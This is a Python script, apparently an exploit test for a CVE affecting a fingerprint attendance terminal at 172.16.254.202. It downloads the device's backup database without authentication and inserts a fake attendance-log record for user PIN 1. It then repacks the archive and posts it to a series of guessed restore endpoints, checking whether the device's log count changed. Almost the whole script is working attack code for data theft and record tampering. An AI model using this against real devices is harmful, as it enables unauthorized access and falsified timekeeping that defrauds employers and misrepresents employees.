"""
Test if we can modify ZKDB.db from web backup and re-upload to insert fake ATTLOG.

This tests the CVE-2023-4587 vulnerability on 172.16.254.202 with INSERT capability.

Workflow:
1. Download businessData.dat (style=0)
2. Decompress GZIP -> TAR -> ZKDB.db
3. INSERT fake ATT_LOG record
4. Re-pack TAR -> GZIP
5. Upload via /form/DataApp (if restore endpoint exists)
6. Verify new ATTLOG count via /form/DataApp?style=1
"""
import os
import sys
import io
import gzip
import sqlite3
import tarfile
import time
import requests
from datetime import datetime

sys.stdout.reconfigure(encoding='utf-8')

DEVICE_IP = '172.16.254.202'
BASE_URL = f'http://{DEVICE_IP}'

WORK_DIR = r'D:/chamcong/zk_fw_attempts/web_restore_test'
os.makedirs(WORK_DIR, exist_ok=True)

print('='*70)
print('WEB RESTORE + ATTLOG INSERT TEST - 172.16.254.202')
print('='*70)

# Step 1: Download baseline ATTLOG count
print('\n[1] Downloading baseline via /form/DataApp?style=1...')
url = f'{BASE_URL}/form/DataApp?style=1'
r = requests.get(url, timeout=30)
print(f'    Status: {r.status_code}, Size: {len(r.content)} bytes')
if r.status_code == 200 and r.content[:15] == b'ZK format 1.0.0.0':
    baseline_count = int(r.content[15:25])
    print(f'    Baseline ATTLOG count (decoded): {baseline_count}')
else:
    baseline_count = None
    print(f'    Header: {r.content[:50]}')

# Step 2: Download businessData.dat (style=0)
print('\n[2] Downloading businessData.dat via /form/DataApp?style=0...')
url = f'{BASE_URL}/form/DataApp?style=0'
r = requests.get(url, timeout=120)
print(f'    Status: {r.status_code}, Size: {len(r.content)} bytes')
backup_path = os.path.join(WORK_DIR, 'data.dat')
with open(backup_path, 'wb') as f:
    f.write(r.content)
print(f'    Saved: {backup_path}')

# Step 3: Decompress
print('\n[3] Decompressing GZIP+TAR...')
# Find GZIP offset
gzip_off = r.content.find(b'\x1f\x8b\x08')
print(f'    GZIP at offset: {gzip_off:#x}')

bio = io.BytesIO(r.content[gzip_off:])
with gzip.GzipFile(fileobj=bio) as gz:
    tar_data = gz.read()
print(f'    TAR data: {len(tar_data)} bytes')

# Step 4: Extract ZKDB.db from TAR (skip 512-byte header)
print('\n[4] Extracting ZKDB.db from TAR...')
# TAR structure: 512-byte header + file data
# ZKDB.db starts at offset 0x200 (right after TAR header)
sqlite_magic = b'SQLite format 3'
sqlite_off = tar_data.find(sqlite_magic)
if sqlite_off < 0:
    print('    ERROR: No SQLite magic found')
    sys.exit(1)
# File size in TAR header (octal at offset 124-136)
tar_header = tar_data[:512]
file_size = int(tar_header[124:136].rstrip(b'\x00'), 8)
print(f'    TAR file size from header: {file_size}')
zkdb_data = tar_data[sqlite_off:sqlite_off + file_size]
zkdb_path = os.path.join(WORK_DIR, 'ZKDB.db')
with open(zkdb_path, 'wb') as f:
    f.write(zkdb_data)
print(f'    Saved: {zkdb_path} ({os.path.getsize(zkdb_path)} bytes)')

# Step 5: Insert fake ATTLOG record
print('\n[5] Inserting fake ATTLOG record...')
conn = sqlite3.connect(zkdb_path)
cur = conn.cursor()

# Get current count
cur.execute('SELECT COUNT(*) FROM ATT_LOG')
before_count = cur.fetchone()[0]
print(f'    Before insert: {before_count} rows')

# Get current max ID
cur.execute('SELECT MAX(ID) FROM ATT_LOG')
max_id = cur.fetchone()[0]
print(f'    Max ID: {max_id}')

# Get sample user_info to find PIN 1
cur.execute("SELECT User_PIN, Name FROM USER_INFO WHERE User_PIN IN ('1','1383','267') LIMIT 5")
users = cur.fetchall()
print(f'    Available users: {users}')

# Insert fake record for PIN 1 at a specific time
fake_pin = '1'
fake_time = '2026-09-15T14:30:00'
fake_id = max_id + 1

cur.execute('''
    INSERT INTO ATT_LOG (User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
''', (fake_pin, 1, fake_time, 0, 0, 0, 0, 'web_restore_test', fake_time, 0))
conn.commit()

cur.execute('SELECT COUNT(*) FROM ATT_LOG')
after_count = cur.fetchone()[0]
print(f'    After insert: {after_count} rows (delta: {after_count - before_count})')

# Get the inserted record
cur.execute('SELECT * FROM ATT_LOG WHERE User_PIN=? AND Verify_Time=?', (fake_pin, fake_time))
new_record = cur.fetchone()
print(f'    Inserted: ID={new_record[0]}, PIN={new_record[1]}, Time={new_record[3]}, Status={new_record[4]}')
conn.close()

# Step 6: Re-pack as TAR (just header + data, no padding complexity)
print('\n[6] Re-packing TAR...')
# Build minimal TAR manually: header + data + padding
new_tar_data = bytearray()
# TAR header (512 bytes)
tar_header = bytearray(512)
fn_bytes = b'ZKDB.db'
tar_header[0:len(fn_bytes)] = fn_bytes
# Mode: 0755
mode_bytes = b'0000755\x00'
tar_header[100:100+len(mode_bytes)] = mode_bytes
# UID/GID: 0
tar_header[108:112] = b'0000\x00'
tar_header[116:120] = b'0000\x00'
# Size (octal, padded)
size_str = f'{file_size:011o}\x00'.encode()
tar_header[124:124+len(size_str)] = size_str
# Mtime
mtime_str = b'15252234061\x00'
tar_header[136:136+len(mtime_str)] = mtime_str
# Type flag: regular file
tar_header[156] = ord('0')
# Magic: ustar
tar_header[257:263] = b'ustar\x00'
# Checksum (set to spaces first, then compute)
tar_header[148:156] = b'        '
# Compute checksum
chk = sum(tar_header)
chk_str = f'{chk:06o}\x00 '.encode()
tar_header[148:148+len(chk_str)] = chk_str
new_tar_data.extend(tar_header)
new_tar_data.extend(zkdb_data)
# Pad to 512 alignment
pad_len = ((file_size + 511) // 512) * 512 - file_size
new_tar_data.extend(b'\x00' * pad_len)
# End-of-archive (2 zero blocks)
new_tar_data.extend(b'\x00' * 1024)
new_tar_path = os.path.join(WORK_DIR, 'ZKDB_new.tar')
with open(new_tar_path, 'wb') as f:
    f.write(bytes(new_tar_data))
print(f'    Saved: {new_tar_path} ({len(new_tar_data)} bytes)')

# Step 7: GZIP compress
print('\n[7] GZIP compressing...')
with open(new_tar_path, 'rb') as f_in:
    raw = f_in.read()
gz_buf = io.BytesIO()
with gzip.GzipFile(fileobj=gz_buf, mode='wb') as gz_out:
    gz_out.write(raw)
gz_data = gz_buf.getvalue()
print(f'    Compressed: {len(gz_data)} bytes')

# Step 8: Try to upload via various endpoints
print('\n[8] Testing upload endpoints (searching for restore)...')

# Try POST endpoints
upload_endpoints = [
    '/form/DataApp',  # may support POST
    '/form/DataApp?style=1',
    '/form/DataApp?style=0',
    '/form/DataApp?Action=upload',
    '/iWsService',
    '/cgi-bin/Restore',
    '/form/Restore',
    '/form/upload',
    '/form/DataApp?restore=1',
]

for ep in upload_endpoints:
    print(f'\n  Testing {ep}...')
    try:
        # POST with multipart
        files = {'file': ('businessData.dat', gz_data, 'application/octet-stream')}
        r = requests.post(f'{BASE_URL}{ep}', files=files, timeout=15)
        print(f'    POST: status={r.status_code}, len={len(r.content)}, first 100: {r.content[:100]!r}')
    except Exception as e:
        print(f'    POST error: {e}')
    try:
        # POST with raw body
        r = requests.post(f'{BASE_URL}{ep}', data=gz_data, headers={'Content-Type': 'application/octet-stream'}, timeout=15)
        print(f'    RAW: status={r.status_code}, len={len(r.content)}, first 100: {r.content[:100]!r}')
    except Exception as e:
        print(f'    RAW error: {e}')

# Step 9: Verify count again
print('\n[9] Re-checking count after attempted uploads...')
time.sleep(3)
r = requests.get(f'{BASE_URL}/form/DataApp?style=1', timeout=30)
print(f'    Status: {r.status_code}, Size: {len(r.content)} bytes')
if r.status_code == 200 and r.content[:15] == b'ZK format 1.0.0.0':
    after_test_count = int(r.content[15:25])
    print(f'    After test count: {after_test_count}')
    if after_test_count != baseline_count:
        print(f'    *** COUNT CHANGED: {baseline_count} -> {after_test_count} ***')
    else:
        print('    Count unchanged (uploads did not modify device)')
else:
    print(f'    Header: {r.content[:50]}')

print('\n' + '='*70)
print('TEST COMPLETE')
print('='*70)